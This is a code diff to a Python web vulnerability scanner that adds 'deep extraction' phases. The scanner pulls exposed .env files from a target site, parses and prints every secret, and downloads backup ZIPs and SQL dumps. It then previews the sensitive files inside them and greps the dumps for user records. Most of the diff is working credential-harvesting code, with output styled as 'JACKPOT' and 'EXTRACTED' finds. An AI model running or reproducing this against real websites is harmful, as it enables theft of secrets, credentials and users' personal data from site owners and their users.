+        # PHASE 2: Test for .env files with DEEP SECRET EXTRACTION
+        env_files = ['/.env', '/.env.local', '/.env.production', '/.env.staging', '/.env.development']
+        for env_file in env_files:
             try:
-                url = urljoin(target, file_path)
-                # PHASE 1: Check if file exists
+                url = urljoin(target, env_file)
                 r = requests.get(url, timeout=5, allow_redirects=False)
                 
-                # PHASE 2: Verify it's the ACTUAL file, not just HTTP 200 with HTML/SPA fallback
-                if r.status_code == 200 and len(r.text) > 10:
-                    # Validator function checks if content is actually the expected file type
-                    if validator(r.text):
+                if r.status_code == 200 and '=' in r.text and not r.text.strip().startswith('<html'):
+                    print(Colors.critical(f"\n    [🔥 JACKPOT] {env_file} EXPOSED - EXTRACTING ALL SECRETS..."))
+                    
+                    # Parse .env file
+                    env_secrets = {}
+                    for line in r.text.split('\n'):
+                        line = line.strip()
+                        if '=' in line and not line.startswith('#'):
+                            key, value = line.split('=', 1)
+                            key = key.strip()
+                            value = value.strip().strip('"').strip("'")
+                            if len(value) > 5 and value not in ['', 'null', 'undefined', 'your_key_here']:
+                                env_secrets[key] = value
+                    
+                    if env_secrets:
+                        print(Colors.critical(f"      [💀 EXTRACTED] {len(env_secrets)} secrets from {env_file}:"))
+                        for key, val in list(env_secrets.items())[:10]:
+                            print(Colors.success(f"        {key}={val[:50]}..."))
+                        
                         vulns.append(Vulnerability(
-                            type="SENSITIVE_FILE_EXPOSED",
-                            severity=severity,
-                            location=file_path,
-                            description=description,
-                            evidence=r.text[:300],
-                            remediation=f"Remove or restrict access to {file_path}",
+                            type="ENV_FILE_FULL_EXTRACTION",
+                            severity="CRITICAL",
+                            location=env_file,
+                            description=f"Environment file exposed with {len(env_secrets)} secrets extracted",
+                            evidence=f"Extracted keys: {', '.join(list(env_secrets.keys())[:10])}",
+                            remediation="Remove .env files from public directory",
                             exploitable=True
                         ))
+                
+                time.sleep(self.config.delay)
+            except:
+                pass
+        
+        # PHASE 3: Download and extract backup files
+        backup_files = [
+            '/backup.zip', '/backup.tar.gz', '/site.zip', '/www.zip',
+            '/db.sql', '/database.sql', '/dump.sql', '/backup.sql',
+            '/backup.tar', '/site.tar', '/source.zip'
+        ]
+        
+        for backup_file in backup_files:
+            try:
+                url = urljoin(target, backup_file)
+                r = requests.get(url, timeout=10, allow_redirects=False, stream=True)
+                
+                if r.status_code == 200:
+                    content_type = r.headers.get('content-type', '').lower()
+                    content_length = int(r.headers.get('content-length', 0))
+                    
+                    # Verify it's not HTML
+                    first_chunk = next(r.iter_content(chunk_size=1024), b'')
+                    is_html = first_chunk.strip().startswith(b'<!DOCTYPE') or first_chunk.strip().startswith(b'<html')
+                    
+                    if not is_html and content_length > 1000:
+                        print(Colors.critical(f"\n    [🔥 JACKPOT] {backup_file} DOWNLOADABLE ({content_length} bytes) - DOWNLOADING..."))
+                        
+                        # Download full file (limit to 50MB)
+                        if content_length < 50_000_000:
+                            full_content = first_chunk + r.content
+                            
+                            # Try to extract if ZIP
+                            if backup_file.endswith('.zip'):
+                                try:
+                                    import zipfile
+                                    import io
+                                    
+                                    with zipfile.ZipFile(io.BytesIO(full_content)) as zf:
+                                        file_list = zf.namelist()
+                                        print(Colors.success(f"      [✓] ZIP contains {len(file_list)} files"))
+                                        
+                                        # Look for sensitive files in ZIP
+                                        sensitive_in_zip = [f for f in file_list if any(x in f.lower() for x in ['.env', 'config', 'secret', 'key', 'password', '.sql'])]
+                                        
+                                        if sensitive_in_zip:
+                                            print(Colors.critical(f"      [💀 FOUND] Sensitive files in ZIP:"))
+                                            for sf in sensitive_in_zip[:10]:
+                                                print(Colors.success(f"        - {sf}"))
+                                                
+                                                # Extract and read sensitive files
+                                                try:
+                                                    file_content = zf.read(sf).decode('utf-8', errors='ignore')[:1000]
+                                                    print(Colors.info(f"          Preview: {file_content[:100]}..."))
+                                                except:
+                                                    pass
+                                except Exception as e:
+                                    print(Colors.warning(f"      [!] Could not extract ZIP: {e}"))
+                            
+                            # If SQL file, search for credentials
+                            if backup_file.endswith('.sql'):
+                                sql_preview = full_content.decode('utf-8', errors='ignore')[:5000]
+                                
+                                # Search for INSERT statements with credentials
+                                import re
+                                inserts = re.findall(r'INSERT INTO.*users.*VALUES\s*\([^)]+\)', sql_preview, re.IGNORECASE)
+                                if inserts:
+                                    print(Colors.critical(f"      [💀 FOUND] User records in SQL:"))
+                                    for ins in inserts[:5]:
+                                        print(Colors.success(f"        {ins[:100]}..."))
+                            
+                            vulns.append(Vulnerability(
+                                type="BACKUP_FILE_DOWNLOADED",
+                                severity="CRITICAL",
+                                location=backup_file,
+                                description=f"Backup file downloaded and analyzed ({content_length} bytes)",
+                                evidence=f"File type: {content_type}, Downloaded and extracted",
+                                remediation="Remove backup files from web directory",
+                                exploitable=True
+                            ))
+                
+                time.sleep(self.config.delay)
+            except:
+                pass
+        
+        # PHASE 4: Other sensitive files
+        other_files = [
+            ('/composer.json', lambda txt: '"require"' in txt or '"name"' in txt, 'MEDIUM'),
+            ('/package.json', lambda txt: '"dependencies"' in txt or '"name"' in txt, 'MEDIUM'),
+            ('/phpinfo.php', lambda txt: 'PHP Version' in txt, 'HIGH'),
+            ('/config.json', lambda txt: txt.strip().startswith('{'), 'HIGH'),
+        ]
+        
+        for file_path, validator, severity in other_files:
+            try:
+                url = urljoin(target, file_path)
+                r = requests.get(url, timeout=5, allow_redirects=False)
+                
+                if r.status_code == 200 and len(r.text) > 10 and validator(r.text):
+                    vulns.append(Vulnerability(
+                        type="SENSITIVE_FILE_EXPOSED",
+                        severity=severity,
+                        location=file_path,
+                        description=f"Sensitive file exposed: {file_path}",
+                        evidence=r.text[:300],
+                        remediation=f"Remove {file_path} from public directory",
+                        exploitable=True
+                    ))
                 
                 time.sleep(self.config.delay * 0.5)
             except:
@@ -2153,7 +2608,7 @@ class VulnerabilityScanner:
         attack_phases = [
             ("Security Headers", lambda: self.analyze_security_headers(target)),
             ("CORS Configuration", lambda: self.check_cors_misconfig(target)),
-            ("Sensitive Files", lambda: self.discover_sensitive_endpoints(target)),
+            ("Sensitive Files + Deep Extraction", lambda: self.discover_sensitive_endpoints(target)),
             ("HTTP Methods", lambda: self.test_http_methods(target)),
             ("Code Word Attacks", lambda: self.code_words.run_all_code_word_attacks(target)),
             ("Web Exploitation", lambda: self.web_exploits.run_all_web_attacks(target)),
@@ -2181,6 +2636,19 @@ class VulnerabilityScanner:
                     
             except Exception as e:
                 print(Colors.warning(f"[!] Error in {phase_name}: {str(e)}"))
+        
+        # Add subdomain takeover vulnerabilities from recon phase
+        if hasattr(self, 'recon_engine') and hasattr(self.recon_engine, 'subdomain_takeovers'):
+            for takeover in self.recon_engine.subdomain_takeovers:
+                all_vulns.append(Vulnerability(
+                    type="SUBDOMAIN_TAKEOVER",
+                    severity="HIGH",
+                    location=takeover['subdomain'],
+                    description=f"Subdomain takeover vulnerability via {takeover['service']}",
+                    evidence=takeover['evidence'],
+                    remediation=f"Remove DNS record or claim {takeover['service']} account",
+                    exploitable=True
+                ))
         
         self.all_vulnerabilities = all_vulns
         
@@ -3096,6 +3564,9 @@ class UltimateMegaScanner:
             # PHASE 1: RECONNAISSANCE
             # ═══════════════════════════════════════════════════════════════
             self.scan_results['recon'] = self.recon.run_full_recon(target)
+            
+            # Store recon engine reference for subdomain takeover vulns
+            self.scanner.recon_engine = self.recon
             
             # ═══════════════════════════════════════════════════════════════
             # PHASE 2: VULNERABILITY SCANNING
